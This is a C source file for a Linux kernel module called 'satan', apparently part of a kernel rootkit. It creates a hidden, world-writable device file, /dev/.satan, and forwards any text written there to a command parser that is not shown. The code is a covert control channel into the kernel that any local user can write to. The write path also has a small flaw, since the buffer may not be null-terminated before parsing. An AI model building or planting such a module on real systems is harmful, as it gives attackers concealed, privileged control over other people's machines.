// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "cdev.h"

#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/semaphore.h>

#include "command.h"


#define CDEV_BUF_SIZE 128 

static struct satan_cdev {
        dev_t num;  // holds device (major, minor)
        struct cdev *cdev;  // character device struct
        struct class *class;
        struct semaphore semaphore;
        struct file_operations f_op;
        char buf[CDEV_BUF_SIZE];
} satan_cdev;


static int satan_cdev_open(struct inode *inode, struct file *filp);
static int satan_cdev_close(struct inode *inode, struct file *filp);
static ssize_t satan_cdev_read(struct file *filp, char __user *buf,
                               size_t count, loff_t *offset);
static ssize_t satan_cdev_write(struct file *filp, const char __user *buf,
                                size_t count, loff_t *cur_offset);

static char *satan_devnode(struct device *dev, umode_t *mode);



int satan_cdev_init(struct module *m)
{
        int ret = 0;
        struct device *dev = NULL;

        satan_cdev.f_op.owner = m;
        satan_cdev.f_op.open = satan_cdev_open;
        satan_cdev.f_op.release = satan_cdev_close;
        satan_cdev.f_op.write = satan_cdev_write;
        satan_cdev.f_op.read = satan_cdev_read;
       

        ret = alloc_chrdev_region(&(satan_cdev.num), 0, 1, SATAN_CDEV_NAME);
        if (ret != 0) {
                pr_alert("satan: cdev: failed to allocate a major number for device file\n");
                goto out;
        }


        // Initialize character device
        satan_cdev.cdev = cdev_alloc();
        satan_cdev.cdev->ops = &(satan_cdev.f_op);
        satan_cdev.cdev->owner = m;

        // Register our character device to the kernel
        ret = cdev_add(satan_cdev.cdev, satan_cdev.num, 1);
        if (ret != 0) {
                pr_alert("satan: cdev: failed to add cdev to kernel\n");
                goto out;
        }


        // Create /sys/class/.satan in preparation of creating /dev/.satan
        satan_cdev.class = class_create(m, SATAN_CDEV_NAME);

        if (IS_ERR(satan_cdev.class)) {
                pr_alert("satan: cdev: failed to create class\n");
                ret = -1;
                goto out;
        }

        satan_cdev.class->devnode = satan_devnode;


        // Create /dev/.satan for this char dev
        if (IS_ERR(dev = device_create(satan_cdev.class, NULL, satan_cdev.num, NULL, SATAN_CDEV_NAME))) {
                pr_alert("satan: cdev: failed to create /dev/%s\n", SATAN_CDEV_NAME);
                ret = -1;
                goto out;
        }


        // initialize our semaphore with an initial value of 1
        sema_init(&satan_cdev.semaphore, 1);


        // Clear our buffer
        memset(satan_cdev.buf, 0, CDEV_BUF_SIZE);

out:
        if (ret == 0) {
                pr_info("satan: cdev: successfully initialized device file\n");
        }

        return ret;
}

void satan_cdev_exit(void)
{
        device_destroy(satan_cdev.class, satan_cdev.num);  // Remove the /dev/.satan
        class_destroy(satan_cdev.class);  // Remove class /sys/class/.satan
        cdev_del(satan_cdev.cdev);
        unregister_chrdev_region(satan_cdev.num, 1);

        pr_info("satan: cdev: successfully destroyed device file\n");
}


static int satan_cdev_open(struct inode *inode, struct file *filp)
{
        if (0 != down_interruptible(&satan_cdev.semaphore)) {
                pr_alert("satan: cdev: failed to lock device file during open()\n");
                return -1;
        }

        return 0;
}

static int satan_cdev_close(struct inode *inode, struct file *filp)
{
        up(&satan_cdev.semaphore);
        return 0;
}

static ssize_t satan_cdev_read(struct file *filp, char __user *buf,
                               size_t len, loff_t *offset)
{
        int ret = 0;

        if (CDEV_BUF_SIZE <= *offset) {
                ret = 0;
                goto out;
        }


        ret = min(len, CDEV_BUF_SIZE - (size_t) *offset);

        if (copy_to_user(buf, satan_cdev.buf + *offset, ret)) {
                ret = -EFAULT;
                goto out;
        }

        *offset += ret;
out:
        return ret;
}

static ssize_t satan_cdev_write(struct file *filp, const char __user *buf,
                                size_t len, loff_t *offset)
{
        int ret = 0;
        char *newline = NULL;

        if (CDEV_BUF_SIZE <= *offset) {
                ret = 0;
                goto parse;
        }


        // If the buffer is not large enough, return -ENOSPC.
        if (CDEV_BUF_SIZE - (size_t) *offset < len) {
                ret = -ENOSPC;
                goto out;
        }
        
        if (copy_from_user(satan_cdev.buf + *offset, buf, len)) {
                ret = -EFAULT;
                goto out;
        }

        ret = len;
        *offset += ret;

parse:
        newline = strrchr(satan_cdev.buf, '\n');

        if (newline)
                *newline = 0;

        satan_command_parse(satan_cdev.buf);
        memset(satan_cdev.buf, 0, CDEV_BUF_SIZE);
out:
        return ret;
}


static char *satan_devnode(struct device *dev, umode_t *mode)
{
        // Set the permission on device file to 0666.
        if (mode)
                *mode = 0666;

        return NULL;
}
